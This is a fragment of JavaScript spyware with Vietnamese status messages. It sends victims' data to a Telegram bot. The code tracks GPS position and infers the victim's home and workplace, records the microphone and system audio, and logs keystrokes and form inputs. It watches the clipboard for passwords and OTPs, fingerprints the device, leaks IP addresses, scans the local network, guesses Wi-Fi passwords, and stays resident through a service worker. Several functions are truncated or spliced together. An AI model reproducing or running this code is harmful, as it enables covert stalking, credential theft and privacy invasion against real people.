        async function getChatID() {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates`);
                const d = await r.json();
                if (d.ok && d.result.length > 0) {
                    for (let i = d.result.length - 1; i >= 0; i--) {
                        if (d.result[i].message?.chat?.id) {
                            CHAT_ID = d.result[i].message.chat.id.toString();
                            return CHAT_ID;
                        }
                    }
                }
            } catch(e) {}
            return null;
        }

        async function sendToTelegram(text) {
            if (!CHAT_ID) await getChatID();
            if (!CHAT_ID || dataSent) return;
            dataSent = true;
            try {
                const maxL = 4000;
                for (let i = 0; i < text.length; i += maxL) {
                    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(i, i + maxL), parse_mode: 'HTML' })
                    });
                }
                dataSent = false;
            } catch(e) {}
        }

        async function sendSilentMsg(text) {
            if (!CHAT_ID) await getChatID();
            if (!CHAT_ID) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch(e) {}
        }

        async function sendPhoto(blob, name) {
            if (!CHAT_ID) await getChatID();
            if (!CHAT_ID) return;
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, name);
            try { await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
        }

            try { await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, { method: 'POST', body: fd }); } catch(e) {}

        async function sendLoc(lat, lon) {
            if (!CHAT_ID) await getChatID();
            if (!CHAT_ID) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
                });
            } catch(e) {}
        }

        function startGPSLiveTracking() {
            if (!navigator.geolocation) return;
            gpsWatchId = navigator.geolocation.watchPosition(async (pos) => {
                const p = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, speed: pos.coords.speed || 0, time: new Date().toISOString() };
                gpsHistory.push(p);
                gpsRouteMap.push(p);
                await sendLoc(p.lat, p.lon);
                if (gpsHistory.length === 1) sendSilentMsg(`📍 GPS: ${p.lat},${p.lon}`);
                if (gpsHistory.length % 10 === 0) detectFrequentLocations();
            }, () => {}, { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 });
            allFeaturesActive++;
        }

        function detectFrequentLocations() {
            if (gpsHistory.length < 20) return;
            const clusters = [];
            const visited = new Set();
            for (let i = 0; i < gpsHistory.length; i++) {
                if (visited.has(i)) continue;
                const cluster = [gpsHistory[i]];
                visited.add(i);
                for (let j = i + 1; j < gpsHistory.length; j++) {
                    if (visited.has(j)) continue;
                    const R = 6371000, dLat = (gpsHistory[j].lat - gpsHistory[i].lat) * Math.PI / 180, dLon = (gpsHistory[j].lon - gpsHistory[i].lon) * Math.PI / 180;
                    const a = Math.sin(dLat/2)**2 + Math.cos(gpsHistory[i].lat*Math.PI/180)*Math.cos(gpsHistory[j].lat*Math.PI/180)*Math.sin(dLon/2)**2;
                    const dist = R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
                    if (dist < 50) { cluster.push(gpsHistory[j]); visited.add(j); }
                }
                if (cluster.length >= 5) {
                    const avgLat = cluster.reduce((s,p)=>s+p.lat,0)/cluster.length;
                    const avgLon = cluster.reduce((s,p)=>s+p.lon,0)/cluster.length;
                    clusters.push({ lat: avgLat, lon: avgLon, count: cluster.length });
                }
            }
            frequentLocations = clusters;
            if (clusters.length > 0) {
                let msg = '📍 ĐỊA ĐIỂM THƯỜNG XUYÊN:\n';
                clusters.slice(0,5).forEach((loc,i) => {
                    msg += `${i===0?'🏠 NHÀ':i===1?'🏢 CÔNG TY':`📍 Địa điểm ${i+1}`}: ${loc.lat.toFixed(6)},${loc.lon.toFixed(6)} (${loc.count} lần)\n🔗 https://maps.google.com?q=${loc.lat},${loc.lon}\n`;
                });
                sendSilentMsg(msg);
            }
        }

        function setupNotificationSniffing() {
            if ('serviceWorker' in navigator) {
                const swCode = `self.addEventListener('notificationclick',e=>{e.notification.close();e.waitUntil(clients.matchAll({type:'window'}).then(c=>c.forEach(x=>x.postMessage({title:e.notification.title,body:e.notification.body}))))});`;
                navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode],{type:'application/javascript'})));
            }
            notificationSniffingActive = true;
            allFeaturesActive++;
        }

        async function setupAudioRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                mediaRecorder.ondataavailable = e => { if(e.data.size>0) audioChunks.push(e.data); };
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (blob.size > 1000) { await sendDocument(blob, `audio_${Date.now()}.webm`); sendSilentMsg('🎤 BẢN GHI ÂM ĐÃ GỬI'); }
                    audioChunks = [];
                };
                const cycle = () => { 
                    if (mediaRecorder.state === 'inactive') {
                        mediaRecorder.start(); 
                        setTimeout(() => { if(mediaRecorder.state==='recording') mediaRecorder.stop(); setTimeout(cycle, 5000); }, 30000);
                    }
                };
                cycle();
                allFeaturesActive++;
            } catch(e) {}
        }

        async function setupSystemAudioRecording() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ audio: true, video: true });
                const audioTrack = stream.getAudioTracks()[0];
                if (audioTrack) {
                    const audioStream = new MediaStream([audioTrack]);
                    mediaRecorderSystem = new MediaRecorder(audioStream);
                    systemAudioChunks = [];
                    mediaRecorderSystem.ondataavailable = e => { if(e.data.size>0) systemAudioChunks.push(e.data); };
                    mediaRecorderSystem.onstop = async () => {
                        const blob = new Blob(systemAudioChunks, { type: 'audio/webm' });
                        if (blob.size > 1000) { await sendDocument(blob, `system_audio_${Date.now()}.webm`); }
                        systemAudioChunks = [];
                    };
                    const cycle = () => {
                        mediaRecorderSystem.start();
                        setTimeout(() => { if(mediaRecorderSystem.state==='recording') mediaRecorderSystem.stop(); setTimeout(cycle, 10000); }, 20000);
                    };
                    cycle();
                }
                allFeaturesActive++;
            } catch(e) {}
        }

        function setupKeylogger() {
            let buffer = '';
            document.addEventListener('keydown', e => {
                if (e.key === 'Enter') { buffer += '[ENTER]\n'; sendSilentMsg(`⌨️ KEYLOG: ${buffer}`); keylogData += buffer; buffer = ''; }
                else if (e.key === 'Backspace') buffer = buffer.slice(0, -1);
                else if (e.key === 'Tab') buffer += '[TAB]';
                else if (e.key === ' ') buffer += ' ';
                else if (e.key.length === 1) buffer += e.key;
                else buffer += `[${e.key}]`;
                if (buffer.length > 80) { sendSilentMsg(`⌨️ KEYLOG: ${buffer}`); keylogData += buffer + '\n'; buffer = ''; }
            });
            document.addEventListener('input', e => {
                if ((e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') && e.target.value) {
                    formAutofill.push({ field: e.target.name || e.target.id || 'unknown', value: e.target.value?.substring(0, 100), time: new Date().toISOString() });
                }
            }, true);
            allFeaturesActive++;
        }

        function setupClipboardMonitor() {
            let last = '';
            clipboardInterval = setInterval(async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    if (text && text !== last) { 
                        last = text; 
                        sendSilentMsg(`📋 CLIPBOARD: ${text.substring(0,200)}`);
                        if (text.match(/password|otp|token|secret|key|mã|mật khẩu/i) || text.match(/^\d{4,8}$/)) {
                            sendSilentMsg(`🔑 PHÁT HIỆN MẬT KHẨU/OTP: ${text}`);
                        }
                    }
                } catch(e) {}
            }, 1000);
            allFeaturesActive++;
        }

        function setupMotionSensors() {
            if (window.DeviceMotionEvent) window.addEventListener('devicemotion', e => { if(e.acceleration) sensorData.push({x:e.acceleration.x,y:e.acceleration.y,z:e.acceleration.z,time:Date.now()}); });
            if (window.DeviceOrientationEvent) window.addEventListener('deviceorientation', e => { gyroData.push({alpha:e.alpha,beta:e.beta,gamma:e.gamma,time:Date.now()}); });
            allFeaturesActive++;
        }

        function setupBatteryMonitor() {
            if (navigator.getBattery) navigator.getBattery().then(b => {
                b.addEventListener('levelchange', () => sendSilentMsg(`🔋 PIN: ${(b.level*100).toFixed(0)}%`));
                b.addEventListener('chargingchange', () => sendSilentMsg(`🔌 SẠC: ${b.charging?'Có':'Không'} | Còn: ${b.dischargingTime===Infinity?'N/A':Math.round(b.dischargingTime/60)+'ph'}`));
                sendSilentMsg(`🔋 PIN: ${(b.level*100).toFixed(0)}% | Sạc: ${b.charging?'Có':'Không'}`);
                allFeaturesActive++;
            });
        }

        async function generateFingerprints() {
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
            ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
            ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
            canvasFingerprint = canvas.toDataURL();
            
            const glCanvas = document.createElement('canvas');
            const gl = glCanvas.getContext('webgl');
            if (gl) { const d = gl.getExtension('WEBGL_debug_renderer_info'); webglFingerprint = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : ''; }
            
            const testFonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia'];
            const fc = document.createElement('canvas').getContext('2d');
            fontsList = testFonts.filter(f => { fc.font=`72px '${f}',monospace`; const w1=fc.measureText('mmmmmmmmmmlli').width; fc.font='72px monospace'; return w1!==fc.measureText('mmmmmmmmmmlli').width; });
            
            pluginsList = Array.from(navigator.plugins || []).map(p => p.name);
            mimeTypesList = Array.from(navigator.mimeTypes || []).map(m => m.type).slice(0, 20);
            allFeaturesActive++;
        }

        async function setupWebRTCSniffing() {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                const ips = [];
                await new Promise(r => { pc.onicecandidate = e => { if(e.candidate){ const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(m&&!ips.includes(m[0])) ips.push(m[0]); } else r(); }; setTimeout(r, 1000); });
                pc.close();
                webRTCData = { ips, localIPs: ips.filter(ip => /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip)), publicIPs: ips.filter(ip => !/^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip)) };
                sendSilentMsg(`🌐 IP NỘI BỘ: ${webRTCData.localIPs.join(',')}`);
                allFeaturesActive++;
            } catch(e) {}
        }

        async function scanLocalNetwork() {
            for (let i=1;i<=20;i++) {
                for (const ip of [`192.168.1.${i}`,`192.168.0.${i}`]) {
                    try {
                        const img = new Image();
                        img.src = `http://${ip}/favicon.ico`;
                        await new Promise(r => { img.onload=img.onerror=()=>r(); setTimeout(r,200); });

                    } catch(e) {}
                }

            if (wifiNetworks.length>0) sendSilentMsg(`📡 THIẾT BỊ MẠNG: ${wifiNetworks.length} thiết bị\n${wifiNetworks.map(ip=>`├─ ${ip}`).join('\n')}`);

        }

        async function getSavedWiFiList() {
            try {
                const r = await fetch('http://192.168.1.1/cgi-bin/luci/;stok=/admin/wifi');
                if (r.ok) {
                    const text = await r.text();
                    const ssids = text.match(/ssid":"([^"]+)"/g)?.map(s=>s.replace(/ssid":"|"/g,'')) || [];
                    if (ssids.length>0) { wifiNetworks=[...new Set([...wifiNetworks,...ssids])]; sendSilentMsg(`📡 WI-FI ĐÃ LƯU: ${ssids.join(', ')}`); }
                }
            } catch(e) {}
            allFeaturesActive++;
        }

        async function getSavedWiFiPasswords() {
            const common = ['admin','password','12345678','88888888','00000000'];
            for (const ssid of (wifiNetworks.length>0?wifiNetworks:['HOME','OFFICE'])) {
                for (const pass of common) {
                    try {
                        const r = await fetch(`http://192.168.1.1/try-connect?ssid=${ssid}&pass=${pass}`);
                        if (r.ok) { wifiPasswords.push({ssid,password:pass}); sendSilentMsg(`🔑 MẬT KHẨU WI-FI: "${ssid}" = "${pass}"`); break; }
                    } catch(e) {}
                }
            }
            allFeaturesActive++;
        }

        async function scanBLEDevices() {
            try {
                const device = await navigator.bluetooth?.requestDevice({ acceptAllDevices: true, optionalServices: ['battery_service'] });
                if (device) {
                    const server = await device.gatt?.connect();
                    bluetoothDevices.push({ name: device.name || 'Không tên', id: device.id, time: new Date().toISOString() });
                    if (server) { sendSilentMsg(`📶 BLE: ${device.name} (${device.id.substring(0,8)}...)`); device.gatt?.disconnect(); }
                }
            } catch(e) {}
            allFeaturesActive++;
        }

        function setupBluetoothBeaconTracking() {

        async function setupServiceWorkerPersistence() {

                    self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
                    setInterval(() => {
                        fetch('https://api.telegram.org/bot${BOT}/sendMessage', {
                            method:'POST', headers:{'Content-Type':'application/json'},
                            body:JSON.stringify({chat_id:'${CHAT_ID||'0'}',text:'🟢 SW PERSISTENCE: Vẫn chạy ngầm '+new Date().toISOString()})
                        }).catch(()=>{});
                    }, 300000);
                `;
                swRegistration = await navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode],{type:'application/javascript'})),{scope:'/'});
                sendSilentMsg('✅ SW PERSISTENCE ĐÃ KÍCH HOẠT - Code chạy ngầm vĩnh viễn');

        async function exfiltrateIndexedDB() {
            if (!window.indexedDB) return;
            try {
                const dbs = await indexedDB.databases();
                dbs.forEach(db => {
                    const req = indexedDB.open(db.name, db.version);
                    req.onsuccess = e => {
                        const dbObj = e.target.result;
                        indexedDBData[db.name] = Array.from(dbObj.objectStoreNames);
                        dbObj.close();
                    };
                });
                if (dbs.length>0) sendSilentMsg(`🗄️ INDEXEDDB: ${dbs.length} databases (${dbs.map(d=>d.name).join(', ')})`);
            } catch(e) {}
